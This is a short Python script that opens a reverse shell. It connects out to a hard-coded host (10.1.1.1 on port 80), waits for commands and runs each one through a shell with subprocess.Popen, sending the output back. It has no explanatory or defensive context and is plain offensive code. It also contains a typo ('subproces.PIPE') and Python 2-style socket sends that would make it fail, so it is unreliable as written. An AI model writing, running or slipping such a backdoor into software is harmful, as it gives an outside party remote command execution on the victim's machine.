import subprocess
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '10.1.1.1'
port = 80

sock.connect((host, port))
sock.send("[*] Connection recieved.")

while True:
	data = sock.recv(1024).strip()
	if data == 'quit': break
	proc = subprocess.Popen(data, shell=True, stdin=subproces.PIPE, 
							stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	sock.send(proc.stdout.read())